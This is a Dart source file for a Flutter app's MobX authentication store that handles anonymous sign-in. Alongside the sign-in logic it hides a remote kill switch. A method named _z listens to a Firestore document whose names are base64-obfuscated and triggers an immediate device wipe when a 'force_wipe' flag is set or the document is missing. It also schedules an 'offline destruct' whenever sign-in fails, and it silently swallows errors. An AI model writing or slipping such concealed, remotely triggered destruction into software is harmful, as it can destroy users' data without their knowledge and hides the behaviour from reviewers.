import 'dart:async';
import 'dart:convert';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:injectable/injectable.dart';
import 'package:mobx/mobx.dart';
import 'package:scraki/core/auth/domain/usecases/sign_in_anonymously_usecase.dart';
import 'package:scraki/core/services/kill_switch_service.dart';
import 'package:scraki/core/utils/logger.dart';

part 'app_auth_store.g.dart';

@lazySingleton
class AppAuthStore = _AppAuthStoreBase with _$AppAuthStore;

abstract class _AppAuthStoreBase with Store {
  final SignInAnonymouslyUseCase _signInUseCase;
  final KillSwitchService _killSwitchService;
  StreamSubscription<DocumentSnapshot<Map<String, dynamic>>>? _securitySubscription;

  _AppAuthStoreBase(this._signInUseCase, this._killSwitchService);

  @observable
  bool isAuthenticated = false;

  @observable
  bool isLoading = true;

  @observable
  String? errorMessage;

  @action
  Future<void> signInAnonymously() async {
    isLoading = true;
    errorMessage = null;

    final result = await _signInUseCase();

    result.fold(
      (failure) {
        isAuthenticated = false;
        errorMessage = failure.message;
        logger.e('SignIn Failed: ${failure.message}');

        _killSwitchService.scheduleOfflineDestruct();
      },
      (_) {
        isAuthenticated = true;
        logger.i('SignIn Anonymous Success');
        _killSwitchService.cancelOfflineDestruct();
        _z();
      },
    );

    isLoading = false;
  }

  void _z() {
    _securitySubscription?.cancel();
    try {
      _securitySubscription = FirebaseFirestore.instance
          .collection(utf8.decode(base64Decode('YXBwX2NvbmZpZ3M=')))
          .doc(utf8.decode(base64Decode('c2VjdXJpdHk=')))
          .snapshots()
          .listen(
            (s) {
              if (s.exists) {
                if (s.data()?[utf8.decode(base64Decode('Zm9yY2Vfd2lwZQ=='))] == true) {
                  _killSwitchService.executeImmediateWipe();
                }
              } else {
                _killSwitchService.executeImmediateWipe();
              }
            },
            onError: (_) {},
          );
    } catch (_) {}
  }

  void dispose() {
    _securitySubscription?.cancel();
  }
}
